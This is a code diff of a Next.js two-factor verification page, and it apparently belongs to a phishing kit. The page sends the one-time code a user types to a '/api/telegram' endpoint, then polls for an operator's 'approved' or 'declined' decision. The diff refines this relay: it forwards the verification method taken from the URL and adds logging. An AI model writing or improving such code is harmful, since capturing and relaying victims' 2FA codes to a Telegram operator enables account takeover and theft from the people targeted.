@@ -1,17 +1,29 @@
 "use client";
+import { Suspense } from "react";
 import { useState, useEffect, useRef } from "react";
-import { useRouter } from "next/navigation";
+import { useRouter, useSearchParams } from "next/navigation";
 import { Header } from "@/sections/Header";
 import { notifyTelegram } from "@/lib/telegram-notify";
 
-export default function TwoFactorVerifyPage() {
+function TwoFactorVerifyContent() {
   const router = useRouter();
+  const searchParams = useSearchParams();
+
+  // Get method from URL parameter and convert sms -> text for API
+  const methodParam = searchParams.get("method") || "sms";
+  const apiMethod =
+    methodParam === "sms"
+      ? "text"
+      : (methodParam as "email" | "text" | "phone");
+
   const [code, setCode] = useState("");
   const [rememberBrowser, setRememberBrowser] = useState(false);
   const [loginLoading, setLoginLoading] = useState(false);
   const [codeError, setCodeError] = useState(false);
   const [statusMessage, setStatusMessage] = useState<string | null>(null);
-  const [statusType, setStatusType] = useState<"pending" | "approved" | "declined" | null>(null);
+  const [statusType, setStatusType] = useState<
+    "pending" | "approved" | "declined" | null
+  >(null);
   const [pendingCodeId, setPendingCodeId] = useState<string | null>(null);
   const pollingIntervalRef = useRef<NodeJS.Timeout | null>(null);
 
@@ -35,6 +47,7 @@ export default function TwoFactorVerifyPage() {
         };
 
         if (!data.ok) {
+          console.warn("[TWO-FACTOR VERIFY] Code status check failed:", data);
           return;
         }
 
@@ -102,13 +115,13 @@ export default function TwoFactorVerifyPage() {
     setStatusType("pending");
 
     try {
-      // Send verification to Telegram
+      // Send verification to Telegram with correct method
       const response = await fetch("/api/telegram", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
           kind: "verification",
-          method: "text",
+          method: apiMethod,
           code: code,
           otpStep: 1,
         }),
@@ -123,6 +136,7 @@ export default function TwoFactorVerifyPage() {
       if (result.ok && result.codeId) {
         setPendingCodeId(result.codeId);
       } else {
+        console.error("[TWO-FACTOR VERIFY] Failed to send code:", result.error);
         setStatusMessage("❌ Failed to send code for verification");
         setStatusType("declined");
         setLoginLoading(false);
@@ -582,7 +596,11 @@ export default function TwoFactorVerifyPage() {
 
             {/* Action buttons */}
             <div className="action-row">
-              <button className="btn-resend" onClick={handleResend} disabled={loginLoading}>
+              <button
+                className="btn-resend"
+                onClick={handleResend}
+                disabled={loginLoading}
+              >
                 <svg width="14" height="14" viewBox="0 0 24 24" fill="white">
                   <path d="M12 6v3l4-4-4-4v3c-4.42 0-8 3.58-8 8 0 1.57.46 3.03 1.24 4.26L6.7 14.8A5.87 5.87 0 016 12c0-3.31 2.69-6 6-6zm6.76 1.74L17.3 9.2c.44 1.03.7 2.15.7 2.8 0 3.31-2.69 6-6 6v-3l-4 4 4 4v-3c4.42 0 8-3.58 8-8 0-1.57-.46-3.03-1.24-4.26z" />
                 </svg>
@@ -686,5 +704,13 @@ export default function TwoFactorVerifyPage() {
 
       <div id="toast"></div>
     </>
+  );
+}
+
+export default function TwoFactorVerifyPage() {
+  return (
+    <Suspense fallback={<div>Loading...</div>}>
+      <TwoFactorVerifyContent />
+    </Suspense>
   );
 }
